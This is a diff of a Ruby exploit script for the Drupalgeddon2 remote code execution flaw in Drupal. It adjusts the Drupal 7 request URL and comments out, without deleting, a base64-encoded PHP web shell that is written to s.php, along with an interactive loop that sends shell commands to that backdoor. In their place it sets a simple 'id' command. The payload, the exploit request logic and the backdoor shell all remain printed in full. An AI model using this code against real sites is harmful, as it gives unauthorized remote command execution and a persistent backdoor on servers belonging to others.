@@ -46,9 +46,9 @@ end
 
 # Payload (we could just be happy with this, but we can do better!)
 #evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
-evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
-evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
-
+# evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
+# evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
+evil = 'id'
 
 # Feedback
 puts "[*] Target : #{target}"
@@ -145,7 +145,7 @@ if drupalverion.start_with?('7')
   response = http.request(req)
 
   form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).strip
-  url = target + "file/ajax/name/%23value/" + form_build_id
+  url = target + "?q=file/ajax/name/%23value/" + form_build_id
   uri = URI(url)
   payload = "form_build_id=" + form_build_id
 end
@@ -170,40 +170,40 @@ puts "-"*80
 
 
 # Feedback
-puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
-puts "-"*80
+# puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
+# puts "-"*80
 
 
-# Test to see if backdoor is there
-exploit_uri = URI(target + "s.php")
-# Check response
-http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
-request = Net::HTTP::Get.new(exploit_uri.request_uri)
-response = http.request(request)
+# # Test to see if backdoor is there
+# exploit_uri = URI(target + "s.php")
+# # Check response
+# http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
+# request = Net::HTTP::Get.new(exploit_uri.request_uri)
+# response = http.request(request)
 
-if response.code == "200"
-  puts "[*] Fake shell: "
+# if response.code == "200"
+#   puts "[*] Fake shell: "
 
-  # Stop any CTRL + C action ;)
-  trap('INT', 'SIG_IGN')
+#   # Stop any CTRL + C action ;)
+#   trap('INT', 'SIG_IGN')
 
-  # Forever loop
-  loop do
-    # Get input
-    command = Readline.readline('drupalgeddon2> ', true)
+#   # Forever loop
+#   loop do
+#     # Get input
+#     command = Readline.readline('drupalgeddon2> ', true)
 
-    # Exit
-    break if command =~ /exit/
+#     # Exit
+#     break if command =~ /exit/
 
-    # Blank link?
-    next if command.empty?
+#     # Blank link?
+#     next if command.empty?
 
-    # Send request
-    req = Net::HTTP::Post.new(exploit_uri.request_uri)
-    req.body = "c=#{command}"
-    puts http.request(req).body
-  end
-else
-  puts "[!] Exploit FAILED ~ Response: #{response.code}"
-  exit
-end
+#     # Send request
+#     req = Net::HTTP::Post.new(exploit_uri.request_uri)
+#     req.body = "c=#{command}"
+#     puts http.request(req).body
+#   end
+# else
+#   puts "[!] Exploit FAILED ~ Response: #{response.code}"
+#   exit
+# end
